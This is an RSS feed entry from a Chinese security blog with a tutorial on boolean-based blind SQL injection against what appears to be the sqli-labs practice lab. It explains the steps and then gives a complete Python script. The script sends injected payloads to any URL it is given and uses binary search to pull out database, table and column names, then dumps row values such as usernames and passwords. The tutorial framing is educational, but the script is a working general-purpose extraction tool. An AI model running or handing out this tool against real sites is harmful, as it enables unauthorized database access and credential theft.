<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>布尔型注入 on </title>
    <link>http://wyb0.com/tags/%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5/</link>
    <description>Recent content in 布尔型注入 on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Wed, 22 Jun 2016 23:32:34 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/tags/%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>SQL注入之布尔型注入</title>
      <link>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5/</link>
      <pubDate>Wed, 22 Jun 2016 23:32:34 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5/</guid>
      <description>

&lt;h3 id=&#34;0x00-特点:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;0x00 特点&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;当页面存在注入，但是没有显示位，且没有用echo &amp;quot;mysql_error()&amp;quot;输出错误信息时可以用，
它一次只能猜测一个字节，速度慢，但是只要存在注入就能用
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-利用方式:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;0x01 利用方式&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+
根据返回页面是否相同来得到数据
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-注入步骤:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;0x02 注入步骤&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;找注入点、猜闭合字符&lt;/li&gt;
&lt;li&gt;猜解列数、尝试得到显示位&lt;/li&gt;
&lt;li&gt;猜数据库名&lt;/li&gt;
&lt;li&gt;猜表名&lt;/li&gt;
&lt;li&gt;猜列名&lt;/li&gt;
&lt;li&gt;猜列值&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;找到注入点-判断闭合字符:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;找到注入点，判断闭合字符&lt;/h4&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_closed_character.png&#34; alt=&#34;得到闭合字符.png&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h4 id=&#34;尝试猜解列数-得到显示位:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;尝试猜解列数，得到显示位&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_order_by.png&#34; alt=&#34;猜解列数.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_display_point.png&#34; alt=&#34;尝试得到显示位.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;得到数据库名:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;得到数据库名&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_db_num.png&#34; alt=&#34;猜解数据库数量.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_db_name_char.png&#34; alt=&#34;猜第5个数据库第2个字符.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;最终得到第五个数据库名为security
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;得到表名:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;得到表名&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_table_num_name_len.png&#34; alt=&#34;猜解表的数量和第4张表的表名长度.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_table_name_char.png&#34; alt=&#34;猜第4个表第1个字符.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;最终依次猜的表名为users
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;得到列名:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;得到列名&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_column_num.png&#34; alt=&#34;猜解有几列.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_column_name_len.png&#34; alt=&#34;猜解users表第2列列名的长度.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_column_name_one_char.png&#34; alt=&#34;猜测users表第2列列名的第1个字符.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;同理最终得到第2列列名为username，第3列列名为password
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;得到列值:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;得到列值&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_column_value_num.png&#34; alt=&#34;猜解数据条数.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_column_value_len.png&#34; alt=&#34;猜解第13条数据username字段值的长度.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_column_value_char.png&#34; alt=&#34;猜解第13条数据username字段值的前两个字符.png&#34;&gt;
&lt;/div&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;依次得到为admin4，同理可得其他数据
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x04-附上python脚本:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;0x04 附上python脚本&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-  

__author__=&amp;quot;reber&amp;quot;

import sys
import urllib
import urllib2
import binascii
import hashlib
from pyfiglet import figlet_format
from optparse import OptionParser


def get_md5_html(url):
    response = urllib2.urlopen(url)
    html = response.read()

    m2 = hashlib.md5()
    m2.update(html)
    md5_html = m2.hexdigest()

    return md5_html

def getAllDatabases(url):
    # global aa
    # print &amp;quot;getAllDatabases&amp;quot;
    # print url
    standard_md5 = get_md5_html(url)
    # print standard_md5

    low = 1
    high = 100
    while low &amp;lt;= high:  #循环结束后得到数据库个数
        mid = (low + high)/2;

        payload = &amp;quot;&#39; and ((select count(distinct+table_schema) from information_schema.tables) &amp;gt; %d)--+&amp;quot; % mid
        # payload = (&amp;quot;%s&amp;quot; % aa).join(payload.split())
        payload = &amp;quot;/**/&amp;quot;.join(payload.split())
        mid_url = url + payload
        mid_md5_html = get_md5_html(mid_url)

        if standard_md5 == mid_md5_html:
            low = mid + 1
        else:
            high = mid-1

        db_num = (low+high+1)/2
    print &amp;quot;The total number of database is: %d&amp;quot; % db_num
    for index in xrange(0,db_num):  #一次循环输出一个数据库名
        low = 1
        high = 30

        while low &amp;lt;= high:  #循环结束后得到数据库名的长度
            mid = (low + high)/2

            payload = &amp;quot;&#39; and (length((select distinct table_schema from information_schema.tables limit %d,1)) &amp;gt; %d)--+&amp;quot; % (index,mid)
            # print payload
            payload = &amp;quot;/**/&amp;quot;.join(payload.split())
            mid_url = url + payload
            mid_md5_html = get_md5_html(mid_url)

            if standard_md5 == mid_md5_html:
                low = mid + 1
            else:
                high = mid-1

            db_name_len = (low+high+1)/2
        # print &amp;quot;database name length:%d&amp;quot; % db_name_len
        print &amp;quot;\tdatabase name is: &amp;quot;,
        for x in xrange(1,db_name_len+1):   #一次for循环输出数据库名的一个字符
            low = 32
            high = 126
            while low &amp;lt;= high: #循环结束后得到数据库名的一个字符的ASCII码
                mid = (low + high)/2
                payload = &amp;quot;&#39; and (select ascii(substr((select distinct table_schema from information_schema.tables limit %d,1), %d, 1)) &amp;gt; %d) --+&amp;quot; % (index,x,mid)
                # print payload
                payload = &amp;quot;/**/&amp;quot;.join(payload.split())
                mid_url = url + payload
                mid_md5_html = get_md5_html(mid_url)

                if standard_md5 == mid_md5_html:
                    low = mid + 1
                else:
                    high = mid-1

                str_ascii = (low+high+1)/2
            database_name_one_str = chr(str_ascii)
            sys.stdout.write(database_name_one_str)
            sys.stdout.flush()
        print

def getAllTablesByDb(url,db_name):
    # print &amp;quot;getAllTablesByDb&amp;quot;
    # print url
    # print db_name
    standard_md5 = get_md5_html(url)
    db_name_hex = &amp;quot;0x&amp;quot; + binascii.b2a_hex(db_name)
    # print standard_md5

    low = 1
    high = 200
    while low &amp;lt;= high:  #循环结束后得到表个数
        mid = (low + high)/2;

        payload = &amp;quot;&#39; and ((select count(distinct+table_name) from information_schema.tables where table_schema=%s) &amp;gt; %d)--+&amp;quot; % (db_name_hex,mid)
        payload = &amp;quot;/**/&amp;quot;.join(payload.split())
        mid_url = url + payload
        mid_md5_html = get_md5_html(mid_url)

        if standard_md5 == mid_md5_html:
            low = mid + 1
        else:
            high = mid-1

        db_num = (low+high+1)/2

    print &amp;quot;Database security contains %d table:&amp;quot; % db_num
    for index in xrange(0,db_num):  #一次循环输出一个表名
        low = 1
        high = 30

        while low &amp;lt;= high:  #循环结束后得到表名的长度
            mid = (low + high)/2

            payload = &amp;quot;&#39; and (length((select distinct table_name from information_schema.tables where table_schema=%s limit %d,1)) &amp;gt; %d)--+&amp;quot; % (db_name_hex,index,mid)
            # print payload
            payload = &amp;quot;/**/&amp;quot;.join(payload.split())
            mid_url = url + payload
            mid_md5_html = get_md5_html(mid_url)

            if standard_md5 == mid_md5_html:
                low = mid + 1
            else:
                high = mid-1

            table_name_len = (low+high+1)/2
        # print db_name_len
        print &amp;quot;\ttable name is: &amp;quot;,
        for x in xrange(1,table_name_len+1):   #一次for循环输出表名的一个字符
            low = 32
            high = 126
            while low &amp;lt;= high: #循环结束后得到表名的一个字符的ASCII码
                mid = (low + high)/2
                payload = &amp;quot;&#39; and (select ascii(substr((select distinct table_name from information_schema.tables where table_schema=%s limit %d,1), %d, 1)) &amp;gt; %d) --+&amp;quot; % (db_name_hex,index,x,mid)
                # print payload
                payload = &amp;quot;/**/&amp;quot;.join(payload.split())
                mid_url = url + payload
                mid_md5_html = get_md5_html(mid_url)

                if standard_md5 == mid_md5_html:
                    low = mid + 1
                else:
                    high = mid-1

                str_ascii = (low+high+1)/2
            table_name_one_str = chr(str_ascii)
            sys.stdout.write(table_name_one_str)
            sys.stdout.flush()
        print 

def getAllColumnsByTable(url,table_name,db_name):
    # print &amp;quot;getAllColumnsByTable&amp;quot;
    #while循环结束后得到列的个数
    #for循环，一次得到一列的列名：
        #while循环得到列名的长度：
        #for循环，一次得出列名的一个字符
    # print url
    # print table_name
    # print db_name
    standard_md5 = get_md5_html(url)
    table_name_hex = &amp;quot;0x&amp;quot; + binascii.b2a_hex(table_name)
    db_name_hex = &amp;quot;0x&amp;quot; + binascii.b2a_hex(db_name)
    # print standard_md5

    low = 1
    high = 100
    while low &amp;lt;= high:  #循环结束后得到列个数
        mid = (low + high)/2;

        payload = &amp;quot;&#39; and ((select count(distinct+column_name) from information_schema.columns where table_name=%s and table_schema=%s) &amp;gt; %d)--+&amp;quot; % (table_name_hex,db_name_hex,mid)
        # print payload
        payload = &amp;quot;/**/&amp;quot;.join(payload.split())
        mid_url = url + payload
        mid_md5_html = get_md5_html(mid_url)

        if standard_md5 == mid_md5_html:
            low = mid + 1
        else:
            high = mid-1

        column_num = (low+high+1)/2
    print &amp;quot;Table %s contains %d columns:&amp;quot; % (table_name,column_num)
    for index in xrange(0,column_num):  #一次循环输出一个列名
        low = 1
        high = 30

        while low &amp;lt;= high:  #循环结束后得到列名的长度
            mid = (low + high)/2

            payload = &amp;quot;&#39; and (length((select distinct column_name from information_schema.columns where table_name=%s and table_schema=%s limit %d,1)) &amp;gt; %d)--+&amp;quot; % (table_name_hex,db_name_hex,index,mid)
            # print payload
            payload = &amp;quot;/**/&amp;quot;.join(payload.split())
            mid_url = url + payload
            mid_md5_html = get_md5_html(mid_url)

            if standard_md5 == mid_md5_html:
                low = mid + 1
            else:
                high = mid-1

            column_name_len = (low+high+1)/2
        # print &amp;quot;column length is: %d&amp;quot; % column_name_len
        print &amp;quot;\tcolumn name is: &amp;quot;,
        for x in xrange(1,column_name_len+1):   #一次for循环输出列名的一个字符
            low = 32
            high = 126
            while low &amp;lt;= high: #循环结束后得到列名的一个字符的ASCII码
                mid = (low + high)/2
                payload = &amp;quot;&#39; and (select ascii(substr((select distinct column_name from information_schema.columns where table_name=%s and table_schema=%s limit %d,1), %d, 1)) &amp;gt; %d) --+&amp;quot; % (table_name_hex,db_name_hex,index,x,mid)
                # print payload
                payload = &amp;quot;/**/&amp;quot;.join(payload.split())
                mid_url = url + payload
                mid_md5_html = get_md5_html(mid_url)

                if standard_md5 == mid_md5_html:
                    low = mid + 1
                else:
                    high = mid-1

                str_ascii = (low+high+1)/2
            column_name_one_str = chr(str_ascii)
            sys.stdout.write(column_name_one_str)
            sys.stdout.flush()
        print

def getAllcontent(url,column_name,table_name,db_name):
    # print &amp;quot;getAllcontent&amp;quot;
    #while循环结束后得到结果的行数
    #for循环，一次得到一行的值
        #while循环得到每个字段的长度
        #for循环，一次得出一个字段的一个字符
    # print url
    # print column_name
    # print table_name
    # print db_name
    column_name = column_name.split(&#39;,&#39;)
    len_column_name = len(column_name)
    # print &amp;quot;len_column_name:%d&amp;quot; % len_column_name
    standard_md5 = get_md5_html(url)
    table_name_hex = &amp;quot;0x&amp;quot; + binascii.b2a_hex(table_name)
    db_name_hex = &amp;quot;0x&amp;quot; + binascii.b2a_hex(db_name)
    # print standard_md5

    low = 1
    high = 10000
    while low &amp;lt;= high:  #循环结束后得到列个数
        mid = (low + high)/2;

        payload = &amp;quot;&#39; and ((select count(*) from %s.%s) &amp;gt; %d)--+&amp;quot; % (db_name,table_name,mid)
        # print payload
        payload = &amp;quot;/**/&amp;quot;.join(payload.split())
        mid_url = url + payload
        mid_md5_html = get_md5_html(mid_url)

        if standard_md5 == mid_md5_html:
            low = mid + 1
        else:
            high = mid-1

        column_value_num = (low+high+1)/2
    print &amp;quot;The %s table with %d row value: &amp;quot; % (table_name,column_value_num)
    stri = &amp;quot;&amp;quot;
    for x in xrange(0,len_column_name):#输出title
        stri += &amp;quot;%s\t&amp;quot; % column_name[x]
    print stri
    for index in xrange(0,column_value_num):  #一次循环输出一行数据
        for y in xrange(0,len_column_name):  #一次输出一行的一列的值,循环完输出一行的值
            low = 1
            high = 30
            # print &amp;quot;len_column_name:%s&amp;quot; % column_name[y]
            while low &amp;lt;= high:  #循环结束后得到一行数据的一列值的长度
                mid = (low + high)/2

                payload = &amp;quot;&#39; and (length((select %s from %s.%s limit %d,1)) &amp;gt; %d)--+&amp;quot; % (column_name[y],db_name,table_name,index,mid)
                # print payload
                payload = &amp;quot;/**/&amp;quot;.join(payload.split())
                mid_url = url + payload
                mid_md5_html = get_md5_html(mid_url)

                if standard_md5 == mid_md5_html:
                    low = mid + 1
                else:
                    high = mid-1

                column_value_len = (low+high+1)/2
            # print &amp;quot;column value length is: %d&amp;quot; % column_value_len
            # print &amp;quot;\tcolumn name is: &amp;quot;,
            for x in xrange(1,column_value_len+1): #得到一行数据的一列的值
                low = 32
                high = 126
                while low &amp;lt;= high: #得到一行数据的一列值的单个字符ASCII码
                    mid = (low + high)/2
                    payload = &amp;quot;&#39; and (select ascii(substr((select %s from %s.%s limit %d,1), %d, 1)) &amp;gt; %d) --+&amp;quot; % (column_name[y],db_name,table_name,index,x,mid)
                    # print payload
                    payload = &amp;quot;/**/&amp;quot;.join(payload.split())
                    mid_url = url + payload
                    mid_md5_html = get_md5_html(mid_url)

                    if standard_md5 == mid_md5_html:
                        low = mid + 1
                    else:
                        high = mid-1

                    str_ascii = (low+high+1)/2
                column_name_one_str = chr(str_ascii)
                sys.stdout.write(column_name_one_str)
                sys.stdout.flush()
            sys.stdout.write(&amp;quot;\t&amp;quot;)
        print


def main():
    print figlet_format(&amp;quot;sqli-bool&amp;quot;)
    parser = OptionParser()
    parser.add_option(&amp;quot;-u&amp;quot;,&amp;quot;--URL&amp;quot;,action=&amp;quot;store&amp;quot;,
              type=&amp;quot;string&amp;quot;,dest=&amp;quot;url&amp;quot;,
              help=&amp;quot;get url&amp;quot;)
    parser.add_option(&amp;quot;-D&amp;quot;,&amp;quot;--DB&amp;quot;,action=&amp;quot;store&amp;quot;,
              type=&amp;quot;string&amp;quot;,dest=&amp;quot;db_name&amp;quot;,
              help=&amp;quot;get database name&amp;quot;)
    parser.add_option(&amp;quot;-T&amp;quot;,&amp;quot;--TBL&amp;quot;,action=&amp;quot;store&amp;quot;,
              type=&amp;quot;string&amp;quot;,dest=&amp;quot;table_name&amp;quot;,
              help=&amp;quot;get table name&amp;quot;)
    parser.add_option(&amp;quot;-C&amp;quot;,&amp;quot;--COL&amp;quot;,action=&amp;quot;store&amp;quot;,
              type=&amp;quot;string&amp;quot;,dest=&amp;quot;column_name&amp;quot;,
              help=&amp;quot;get column name&amp;quot;)

    parser.add_option(&amp;quot;--dbs&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;dbs&amp;quot;,help=&amp;quot;get all database name&amp;quot;)
    parser.add_option(&amp;quot;--current-db&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;current_db&amp;quot;,help=&amp;quot;get current database name&amp;quot;)
    parser.add_option(&amp;quot;--current-user&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;current_user&amp;quot;,help=&amp;quot;get current user name&amp;quot;)
    parser.add_option(&amp;quot;--tables&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;tables&amp;quot;,help=&amp;quot;get tables from databases&amp;quot;)
    parser.add_option(&amp;quot;--columns&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;columns&amp;quot;,help=&amp;quot;get columns from tables&amp;quot;)
    parser.add_option(&amp;quot;--dump&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;dump&amp;quot;,help=&amp;quot;get value&amp;quot;)
    (options,args) = parser.parse_args()


    if options == None or options.url == None:
        parser.print_help()
    elif options.dump and options.column_name and options.table_name and options.db_name:
        getAllcontent(options.url,options.column_name,options.table_name,options.db_name)
    elif options.table_name and options.db_name:
        getAllColumnsByTable(options.url,options.table_name,options.db_name)
    elif options.db_name:
        getAllTablesByDb(options.url,options.db_name)    
    elif options.dbs:
        getAllDatabases(options.url)
    elif options.current_db:
        getCurrentDb(options.url)
    elif options.current_user:
        getCurrentUser(options.url)
    elif options.url:
        print &amp;quot;you input: sqli-error.py -u %s&amp;quot; % options.url


if __name__ == &#39;__main__&#39;:
    main()
    # getAllDatabases(&amp;quot;http://192.168.188.134/sqli/Less-8/?id=1&amp;quot;)
    # getAllTablesByDb(&amp;quot;http://192.168.188.134/sqli/Less-8/?id=1&amp;quot;,&amp;quot;security&amp;quot;)
    # getAllColumnsByTable(&amp;quot;http://192.168.188.134/sqli/Less-8/?id=1&amp;quot;,&amp;quot;user&amp;quot;,&amp;quot;mysql&amp;quot;)
    # getAllcontent(&amp;quot;http://192.168.188.134/sqli/Less-8/?id=1&amp;quot;,&amp;quot;id,username,password&amp;quot;,&amp;quot;users&amp;quot;,&amp;quot;security&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
  </channel>
</rss>